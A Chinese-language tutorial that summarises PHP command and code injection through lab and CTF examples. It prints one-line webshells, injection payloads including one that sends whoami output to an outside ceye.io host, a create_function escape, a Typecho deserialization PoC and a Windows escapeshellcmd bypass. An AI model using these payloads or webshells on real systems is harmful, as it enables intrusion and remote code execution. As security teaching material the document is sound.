作者：一叶飘零

##  **一、 前记**

今天在合天实验室看到这样一个实验：

![代码注入总结---20180312第二次批注最终2042.png](https://image.3001.net/images/20180326/15220429134964.png!small)

题目对萌新还是比较友好的，属于启蒙项，尚未接触过该类问题的同学可以尝试一下，领略一下命令注入的魅力。（点击<http://www.hetianlab.com/expc.do?ec=2cf0139a-9d8a-4e91-96aa-f3fbec33205e>，可开始学习本实验）

而我个人做罢之余，心想不如总结一下最近遇到的命令或是代码注入的情况，于是便有了这篇文章~

### 1\. **常见php命令注入函数**

eval(),，assert(), system()，preg_replace(), create_function, call_user_func,
call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec()

  

二、 **背景**

### 1\. **知识前提**

这里不再多提，相信大家已经对这几个函数轻车熟路了，常见小马均在使用

> <?php
>
> @eval($_GET["sky"]);
>
> ?>
>
> <?php
>
> @assert($_GET["sky"]);
>
> ?>
>
> <?php
>
> @system($_GET["sky"]);
>
> ?>

  

### 2\. **题目实战**

这里直接就用合天实验室的题目说明

看到题目给出的源码:

> <?php
>
> system("ping -n 2 ".$_GET['ip']);
>
> ?>

正常访问

<http://localhost/web/hetian.php?ip=127.0.0.1>

  
![代码注入总结---20180312第二次批注最终2708.png](https://image.3001.net/images/20180326/15220430812622.png!small)

（23333编码问题请忽略）  

是一个常规的ping命令

我们进行命令注入

<http://localhost/web/hetian.php?ip=>|dir

得到回显

![代码注入总结---20180312第二次批注最终2848.png](https://image.3001.net/images/20180326/15220431276395.png!small)

我们再换个套路，把这段代码放在服务器上(linux)

尝试：

[http://vps_ip/testsky/index.php?ip=](/testsky/index.php?ip=)`whoami`.2bub8m.ceye.io

可以收到回显

![代码注入总结---20180312第二次批注最终3026.png](https://image.3001.net/images/20180326/15220431801072.png!small)

并且这类题目在CTF中可以说屡见不鲜，值得好好掌握

  

三、 **preg_replace()**

### 1\. **知识前提**

查阅php手册

mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [,
int $limit = -1 [, int &$count ]] )

函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。

其中，在错误／异常中提及：

PHP 5.5.0 起， 传入 "\e" 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING
错误，同时 "\e" 也无法起效。

所以正是这个修饰符，让我们可以进行命令注入

但需要知道的是：

7.0.0 不再支持 /e修饰符。 请用 preg_replace_callback() 代替。

5.5.0 /e 修饰符已经被弃用了。使用 preg_replace_callback() 代替。参见文档中 PREG_REPLACE_EVAL
关于安全风险的更多信息。

在实践的时候需要看清php版本,在7.0的版本以后就不再适用！

### 2\. **题目实战**

> error_reporting(0);
>
> $pattern = $_GET[pat];
>
> $replacement = $_GET[rep];
>
> $subject = $_GET[sub];
>
> if (isset($pattern) && isset($replacement) && isset($subject))
>
> {
>
> preg_replace($pattern, $replacement, $subject);
>
> }
>
> else
>
> {
>
> die();
>
> }

调用方法：

preg_replace("/test/e",phpinfo(),"jutst test");

此时phpinfo()将会被执行

因为使用/e修饰符，preg_replace会将 replacement 参数当作 PHP代码执行

所以最后的payload:

?pat=/test/e&rep=phpinfo()⊂=jutst test

?pat=/test/e&rep=var_dump(`dir`)⊂=jutst test

![代码注入总结---20180312第二次批注最终4010.png](https://image.3001.net/images/20180326/1522047345127.png!small)![代码注入总结
---20180312第二次批注最终4012.png](https://image.3001.net/images/20180326/15220473452744.png!small)  

可以看到命令成功注入！

  

 **四、 create_function()**

### 1\. **知识前提**

查阅php手册

string create_function ( string $args , string $code )

函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称

看一个官方样例

> <?php
>
> $newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a *
> $b);');
>
> echo "New anonymous function: $newfunc\n";
>
> echo $newfunc(2, M_E) . "\n";
>
> // outputs
>
> // New anonymous function: lambda_1
>
> // ln(2) + ln(2.718281828459) = 1.6931471805599
>
> ?>

我们不难得到create_function()的原型

> function test($a,$b)
>
> {
>
> return "ln($a) + ln($b) = " . log($a * $b);
>
> }

那么我们开始实战

### 2\. **题目实战1**

此问题曾出现在WordPress <= 4.6.1 使用语言文件任意代码执行

详细分析请戳：<http://blog.knownsec.com/2016/10/wordpress-4-6-1-language-exploit/>

下面给出关键代码

> function make_plural_form_function($nplurals, $expression) {
>
> $expression = str_replace('n', '$n', $expression);
>
> $func_body = "
>
> \$index = (int)($expression);
>
> return (\$index < $nplurals)? \$index : $nplurals - 1;";
>
> return create_function('$n', $func_body);
>
> }

可以清楚看见，关键利用点就是在create_function()

  

### 3\. **题目实战2**

给出《web安全深度剖析》中的一个实例：

> <?php
>
> error_reporting(0);
>
> $sort_by = $_GET['sort_by'];
>
> $sorter = 'strnatcasecmp';
>
> $databases=array('1234','4321');
>
> $sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["'
> . $sort_by . '"]);';
>
> usort($databases, create_function('$a, $b', $sort_function));
>
> ?>

首先构造出函数原型

> function test($a,$b)
>
> {
>
> return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);
>
> }

根据这个，我们可以构造payload:

?sort_by="]);}phpinfo();/*

传入后得到：

return 1 * strnatcasecmp($a[""]);}phpinfo();/*"], $b[""]);}phpinfo();/*"]);

所以此时的函数原型：

> function test($a,$b)
>
> {
>
> return 1 * strnatcasecmp($a[""]);}phpinfo();/*"], $b[""]);}phpinfo();/*"]);
>
> }

很显然，经过`/*`注释符

我们剩下的只有

> function test($a,$b)
>
> {
>
> return 1 * strnatcasecmp($a[""]);
>
> }
>
> phpinfo();

成功的进行了代码注入！

![代码注入总结---20180312第二次批注最终5796.png](https://image.3001.net/images/20180326/15220473654837.png!small)  

五、 **call_user_func()/call_user_func_array()/array_map()**

### 1\. **知识前提**

同样还是查阅官方手册

mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]]
)

函数作用：第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。

mixed call_user_func_array ( callable $callback , array $param_arr )

函数作用：把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。

array array_map ( callable $callback , array $array1 [, array $... ] )

函数作用：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map()
数组数量，两者必须一样。

由于三者类似，这里介绍call_user_func()

我们举个例子

> <?php
>
> $filter= 'assert';
>
> $value = 'phpinfo()';
>
> call_user_func($filter, $value);
>
> ?>

![代码注入总结---20180312第二次批注最终6399.png](https://image.3001.net/images/20180326/15220474213429.png!small)  

可以看到成功执行了命令

### 2\. **题目实战**

前段时间非常火的Typecho反序列化漏洞中最后就用到了这个函数进行代码注入

有兴趣的可以在freebuf这篇文章查看详情：

<http://www.freebuf.com/column/161798.html>

这里截选出最终的利用点

> private function _applyFilter($value)
>
> {
>
> if ($this->_filter) {
>
> foreach ($this->_filter as $filter) {
>
> $value = is_array($value) ? array_map($filter, $value) :
>
> call_user_func($filter, $value);
>
> }
>
> $this->_filter = array();
>
> }
>
> return $value;
>
> }

而当时的原因正是我们可控$filter和$value两个参数

附上payload

> class Typecho_Feed{
>
> private $_type='ATOM 1.0';
>
> private $_items;
>
> public function __construct(){
>
> $this->_items = array(
>
> '0'=>array(
>
> 'author'=> new Typecho_Request())
>
> );
>
> }
>
> }
>
> class Typecho_Request{
>
> private $_params = array('screenName'=>'phpinfo()');
>
> private $_filter = array('assert');
>
> }
>
> $poc = array(
>
> 'adapter'=>new Typecho_Feed(),
>
> 'prefix'=>'typecho');
>
> echo base64_encode(serialize($poc));

  

六、 **反引号**

### 1\. **知识前提**

反引用的本质就是在操作系统执行该命令。此时可以造成命令注入等各种危害

### 2\. **操作实践**

> root@ubuntu-512mb-sfo2-01:/var/www/html/test# echo ls
>
> ls
>
> root@ubuntu-512mb-sfo2-01:/var/www/html/test# `echo ls`
>
> test tets
>
> root@ubuntu-512mb-sfo2-01:/var/www/html/test# ls
>
> test tets

可以明显的看出对比，再看php

> php > $test = `ls`;
>
> php > echo $test;
>
> test
>
> tets

所以反引号在命令注入实战中还是有不小的杀伤力

 **  
**

七、 **ob_start()**

### 1\. **知识前提**

bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase
]]] )

函数描述：此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。

内部缓冲区的内容可以用 ob_get_contents() 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用
ob_end_flush() 函数。另外， 使用 ob_end_clean() 函数会静默丢弃掉缓冲区的内容。

### 2\. **操作实践**

> php > $sky = 'system';
>
> php > ob_start($sky);
>
> php > echo 'ls -al';
>
> php > ob_end_flush();
>
> -rw-r--r-- 1 root root 0 Mar 12 06:46 tets

可以看到成功执行命令

这里注意，如果我这样使用

php > echo 'ls -al';

ls -al

是没有任何作用的

因为这里的$sky被作为输出的回调函数

而我们输入的`ls -al`在缓冲区

经过ob_end_flush()输出缓冲区后，可以得到

system('ls -al')

这样的操作，所以成功执行了命令

 **  
**

八、 **exec()/shell_exec()/escapeshellcmd()/passthru()**

### 1\. **知识前提**

> string exec ( string $command [, array &$output [, int &$return_var ]] )
>
> string shell_exec ( string $cmd )
>
> string escapeshellcmd ( string $command )
>
> void passthru ( string $command [, int &$return_var ] )

这几个就不细说的，读名字都知道是执行shell命令,如果函数执行未过滤完善的可控参数，后果非常危险

### 2\. **注意点**

其中passthru()同 exec() 函数类似,可以将结果直接传送到浏览器。

然后值得一提的是escapeshellcmd()

escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或
system() 函数，或者 执行操作符 之前进行转义。

这里虽然存在安全转义，但是我们注意到官方手册的一句话

Following characters are preceded by a backslash: &#;`|*?~<>^()[]{}$\, \x0A
and \xFF. ' and " are escaped only if they are not paired. In Windows, all
these characters plus % and ! are replaced by a space instead.

就过滤参数而言，这里有一个win下绕过的小tip，也是之前l3m0n师傅提及过的：

测试脚本:

> <?php
>
> $test = 'dir '.$_GET['sky'];
>
> $escaped_test = escapeshellcmd($test);
>
> var_dump($escaped_test);
>
> file_put_contents('out.bat',$escaped_test);
>
> system('out.bat');
>
> ?>

我们直接访问<http://localhost/web/123.php?sky=../> | whoami

得到的是:

H:\wamp64\www\web\123.php:4:string 'dir ../ ^| whoami' (length=17)

H:\wamp64\www\web>dir ../ | whoami

但是执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。

可以用

../ %1a whoami

但是需要注意的是版本问题

5.6.0 The default value for the encoding parameter was changed to be the value
of the default_charset configuration option.

5.4.43, 5.5.27, 5.6.11 感叹号会被空格所替换。

5.6版本后可能不再适用，需要注意

**九、** **popen()/proc_open()/pcntl_exec()**

> resource popen ( string $command , string $mode )
>
> resource proc_open ( string $cmd , array $descriptorspec , array &$pipes [,
> string $cwd [, array $env [, array $other_options ]]] )
>
> void pcntl_exec ( string $path [, array $args [, array $envs ]] )

其中popen()和proc_open()是不会直接返回执行结果的，而是返回一个文件指针，但是命令是已经执行了  

由于没有遇到类似的题目就不多言了:)

**十、** **总结**

命令/代码注入作为一种危害性极大的漏洞，应该引起我们的重视。本文也只是总结了一些常见的命令/代码注入问题，至于潜藏在代码深处的漏洞，还要靠大家自己多多挖掘啦。

最后，郑重说明：利用本文做任何违法事情，与本人和合天智汇无关，资料仅供参考与学习。

